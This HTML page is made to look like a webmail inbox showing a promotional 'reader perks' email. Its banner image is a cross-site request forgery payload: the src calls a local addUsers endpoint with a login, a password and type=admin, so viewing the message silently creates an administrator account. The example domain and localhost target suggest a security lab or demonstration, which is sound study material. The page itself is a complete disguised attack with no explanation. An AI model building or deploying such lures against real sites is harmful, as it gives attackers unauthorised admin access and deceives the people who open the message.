<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Inbox — Reader perks</title>
    <style>
      body {
        font-family: system-ui, sans-serif;
        background: #eef1f5;
        margin: 0;
        padding: 1.5rem;
        color: #1a2b44;
      }
      .chrome {
        max-width: 36rem;
        margin: 0 auto;
        background: #fff;
        border-radius: 8px;
        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
        overflow: hidden;
      }
      .bar {
        background: #f3f4f6;
        padding: 0.65rem 1rem;
        font-size: 0.85rem;
        color: #6b7280;
        border-bottom: 1px solid #e5e7eb;
      }
      .mail {
        padding: 1.25rem 1.35rem 1.5rem;
      }
      h1 {
        font-size: 1.15rem;
        margin: 0 0 0.35rem;
      }
      .from {
        font-size: 0.8rem;
        color: #6b7280;
        margin-bottom: 1rem;
      }
      .promo {
        border: 1px solid #e5e7eb;
        border-radius: 8px;
        padding: 1rem;
        background: #faf8f3;
      }
      .promo p {
        margin: 0 0 0.75rem;
        line-height: 1.5;
        font-size: 0.95rem;
      }
      .banner {
        display: block;
        width: 100%;
        max-width: 320px;
        height: 120px;
        object-fit: cover;
        border-radius: 6px;
        background: #ddd;
      }
    </style>
  </head>
  <body>
    <div class="chrome">
      <div class="bar">Inbox · 1 message</div>
      <article class="mail">
        <h1>Your spring reading reward</h1>
        <p class="from">From: partners@reader-perks.example · Just now</p>
        <div class="promo">
          <p>
            Thanks for being a loyal member. Open this message to refresh your partner benefits — no links to
            click, just view the offer below.
          </p>
          <img
            class="banner"
            alt=""
            src="http://localhost:3003/addUsers?login=tom&amp;password=tom123&amp;type=admin"
          />
        </div>
      </article>
    </div>
  </body>
</html>
